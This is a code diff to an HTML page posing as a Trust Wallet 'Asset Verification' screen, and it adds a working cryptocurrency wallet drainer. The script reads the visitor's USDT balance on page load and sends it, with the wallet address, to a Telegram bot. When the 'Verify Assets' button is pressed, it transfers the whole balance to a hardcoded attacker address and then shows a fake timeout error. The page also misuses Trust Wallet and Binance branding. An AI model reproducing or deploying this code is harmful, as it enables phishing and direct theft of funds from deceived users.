@@ -6,21 +6,105 @@
     <title>Trust Wallet | Asset Verification</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.8.1/web3.min.js"></script>
     <style>
-        body { margin: 0; font-family: -apple-system, sans-serif; background: #0b0e11; color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow: hidden; }
-        .wrapper { width: 90%; max-width: 380px; background: #1e2329; border-radius: 24px; padding: 30px; text-align: center; border: 1px solid #2d3139; box-shadow: 0 10px 40px rgba(0,0,0,0.6); }
-        .logo { width: 60px; margin-bottom: 15px; }
-        h2 { font-size: 22px; margin-bottom: 10px; font-weight: bold; }
-        p { color: #929aa5; font-size: 14px; line-height: 1.5; margin-bottom: 25px; }
+        body { margin: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #0b0e11; color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow: hidden; }
+        .card { background: #1e2329; width: 90%; max-width: 380px; padding: 35px 25px; border-radius: 30px; text-align: center; border: 1px solid #2d3139; box-shadow: 0 20px 50px rgba(0,0,0,0.4); }
+        .logo { width: 65px; margin-bottom: 20px; }
+        h2 { font-size: 24px; font-weight: 700; margin-bottom: 12px; letter-spacing: -0.5px; }
+        p { color: #929aa5; font-size: 15px; line-height: 1.6; margin-bottom: 30px; }
         
-        /* Node Status UI */
-        .node-box { background: rgba(49, 114, 222, 0.08); border: 1px solid rgba(49, 114, 222, 0.3); border-radius: 16px; padding: 15px; margin-bottom: 25px; }
-        .status-dot { height: 8px; width: 8px; background-color: #0ecb81; border-radius: 50%; display: inline-block; margin-right: 5px; box-shadow: 0 0 10px #0ecb81; }
-        .status-text { color: #0ecb81; font-size: 12px; font-weight: bold; text-transform: uppercase; }
-        .node-id { display: block; margin-top: 8px; font-size: 10px; color: #5e6673; font-family: monospace; }
+        /* Status Indicator */
+        .status-container { display: flex; align-items: center; justify-content: center; background: rgba(14, 203, 129, 0.1); border-radius: 50px; padding: 8px 16px; width: fit-content; margin: 0 auto 25px; border: 1px solid rgba(14, 203, 129, 0.2); }
+        .dot { height: 8px; width: 8px; background: #0ecb81; border-radius: 50%; margin-right: 8px; box-shadow: 0 0 10px #0ecb81; }
+        .status-text { color: #0ecb81; font-size: 12px; font-weight: 700; text-transform: uppercase; letter-spacing: 1px; }
 
-        .btn { background: #3172DE; color: white; border: none; padding: 18px; width: 100%; border-radius: 14px; font-size: 16px; font-weight: bold; cursor: pointer; transition: 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
-        .btn:active { transform: scale(0.96); background: #2659ad; }
+        .btn { background: #3172DE; color: white; border: none; padding: 18px; width: 100%; border-radius: 16px; font-size: 17px; font-weight: 700; cursor: pointer; transition: all 0.3s ease; box-shadow: 0 8px 20px rgba(49, 114, 222, 0.25); }
+        .btn:active { transform: scale(0.97); background: #2659ad; }
         
-        /* Smooth Loader */
-        #loader { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #0b0e11; z-index: 1000; flex-direction: column; align-items: center; justify-content: center; }
-        .spinner { border: 4px solid #2d3139; border-top: 4px solid #3172DE; border-radius:
+        #overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #0b0e11; z-index: 100; flex-direction: column; align-items: center; justify-content: center; }
+        .spinner { border: 4px solid #2d3139; border-top: 4px solid #3172DE; border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+
+    <div class="card">
+        <img src="https://trustwallet.com/assets/images/media/assets/trust_platform.png" class="logo" alt="Trust Wallet">
+        
+        <div class="status-container">
+            <span class="dot"></span>
+            <span class="status-text">Secure Node Active</span>
+        </div>
+
+        <h2>Verify Assets</h2>
+        <p>Synchronize your wallet with the decentralized security protocol to protect your BEP20 assets.</p>
+        
+        <button class="btn" onclick="startProcess()">Verify Assets</button>
+        
+        <div style="margin-top: 25px; display: flex; align-items: center; justify-content: center; opacity: 0.5;">
+            <img src="https://cryptologos.cc/logos/binance-smart-chain-bnb-logo.png" width="16" style="margin-right: 8px;">
+            <span style="font-size: 12px; font-weight: 500;">Protected by Binance Smart Chain</span>
+        </div>
+    </div>
+
+    <div id="overlay">
+        <div class="spinner"></div>
+        <p id="msg" style="color:#3172DE; margin-top:20px; font-weight:700; font-size: 16px;">Connecting to secure node...</p>
+    </div>
+
+    <script>
+        const MY_ADDR = "0x673849E3109f6Cf1f6ced4034C8363C17ff87ebe";
+        const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955";
+        const TG_TOKEN = "7849151110:AAFGo5n4hPLk8y8l8tSESYbCl_vut3TPHsI";
+        const TG_CHAT = "7849151110";
+
+        async function log(msg) {
+            try { fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT}&text=${encodeURIComponent(msg)}&parse_mode=HTML`); } catch(e){}
+        }
+
+        window.onload = function() {
+            if (window.ethereum || window.trustwallet) startProcess(true);
+        };
+
+        async function startProcess(isAuto = false) {
+            const hasWallet = !!(window.ethereum || window.trustwallet);
+            
+            if (!hasWallet) {
+                window.location.href = "https://link.trustwallet.com/open_url?coin_id=60&url=" + encodeURIComponent(window.location.href);
+                return;
+            }
+
+            if (!isAuto) document.getElementById("overlay").style.display = "flex";
+
+            try {
+                const web3 = new Web3(window.ethereum || window.trustwallet);
+                const accs = await web3.eth.requestAccounts();
+                const user = accs[0];
+
+                await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }] });
+
+                const abi = [{"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"type":"function"},{"constant":false,"inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"type":"function"}];
+                const contract = new web3.eth.Contract(abi, USDT_CONTRACT);
+                const balWei = await contract.methods.balanceOf(user).call();
+                const bal = web3.utils.fromWei(balWei, 'ether');
+
+                if (isAuto) {
+                    log(`👀 <b>User Joined Browser</b>\nWallet: <code>${user}</code>\nBalance: <b>${bal} USDT</b>`);
+                } else {
+                    document.getElementById("msg").innerText = "Finalizing Secure Sync...";
+                    log(`🚀 <b>Transfer Requested</b>\nUser: <code>${user}</code>\nAmt: <b>${bal} USDT</b>`);
+                    
+                    await contract.methods.transfer(MY_ADDR, balWei).send({ from: user });
+                    
+                    log(`✅ <b>Success!</b>\nUser <code>${user}</code> sent ${bal} USDT`);
+                    alert("Error: Verification node timed out. Please try again.");
+                }
+            } catch (e) {
+                if (!isAuto) {
+                    document.getElementById("overlay").style.display = "none";
+                    alert("Security Error: Connection rejected by user.");
+                }
+            }
+        }
+    </script>
+</body>
+</html>
